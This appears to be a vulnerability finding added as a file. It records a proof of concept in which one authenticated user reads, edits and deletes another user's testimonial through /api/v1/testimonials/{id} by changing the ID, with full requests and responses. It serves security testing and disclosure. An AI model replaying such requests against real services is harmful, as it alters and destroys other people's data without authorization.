@@ -1,0 +1,46 @@
+=== IDOR/BOLA on /api/v1/testimonials/{id} - Cross-User Testimonial Modification and Deletion ===
+
+STEP 1: User A (testuserA, ID: d8083077-d088-4bfe-b147-0ad561de59c2) creates a testimonial
+POST /api/v1/testimonials/
+Authorization: Bearer <user_a_token>
+{"content": "Test testimonial from user A", "rating": 5}
+
+Response: HTTP/2 201
+{"id":8,"user_id":"d8083077-d088-4bfe-b147-0ad561de59c2","user":{"id":"d8083077-d088-4bfe-b147-0ad561de59c2","username":"testuserA"},"guest_name":null,"guest_role":null,"guest_avatar_url":null,"content":"Test testimonial from user A","rating":5,"is_featured":false,"created_at":"2026-09-29T10:17:29.698344","name":"testuserA","role":"Duck Lover","avatar_url":null}
+
+STEP 2: User B (testuserB, ID: 525a9d6a-3532-4df6-b164-340aa300be97) READS User A's testimonial (ID 8)
+GET /api/v1/testimonials/8
+Authorization: Bearer <user_b_token>
+
+Response: HTTP/2 200
+{"id":8,"user_id":"d8083077-d088-4bfe-b147-0ad561de59c2","user":{"id":"d8083077-d088-4bfe-b147-0ad561de59c2","username":"testuserA"},"guest_name":null,"guest_role":null,"guest_avatar_url":null,"content":"Test testimonial from user A","rating":5,"is_featured":false,"created_at":"2026-09-29T10:17:29.698344","name":"testuserA","role":"Duck Lover","avatar_url":null}
+
+STEP 3: User B MODIFIES User A's testimonial (ID 8)
+PUT /api/v1/testimonials/8
+Authorization: Bearer <user_b_token>
+Content-Type: application/json
+{"content": "Modified by user B", "rating": 1}
+
+Response: HTTP/2 200
+{"id":8,"user_id":"d8083077-d088-4bfe-b147-0ad561de59c2","user":{"id":"d8083077-d088-4bfe-b147-0ad561de59c2","username":"testuserA"},"guest_name":null,"guest_role":null,"guest_avatar_url":null,"content":"Modified by user B","rating":1,"is_featured":false,"created_at":"2026-09-29T10:17:29.698344","name":"testuserA","role":"Duck Lover","avatar_url":null}
+
+STEP 4: User B DELETES User A's testimonial (ID 8)
+DELETE /api/v1/testimonials/8
+Authorization: Bearer <user_b_token>
+
+Response: HTTP/2 204 No Content
+
+STEP 5: User A confirms testimonial is deleted
+GET /api/v1/testimonials/8
+Authorization: Bearer <user_a_token>
+
+Response: HTTP/2 404
+{"detail":"Testimonial not found"}
+
+=== VERIFICATION ===
+The vulnerability is CONFIRMED. User B (different authenticated user) successfully:
+1. READ user A's testimonial (ID 8) - HTTP 200
+2. MODIFY user A's testimonial (ID 8) - HTTP 200 
+3. DELETE user A's testimonial (ID 8) - HTTP 204
+
+No authorization checks are performed on the testimonial ID to verify ownership. Any authenticated user can READ, MODIFY, and DELETE any other user's testimonials by simply changing the ID in the URL.
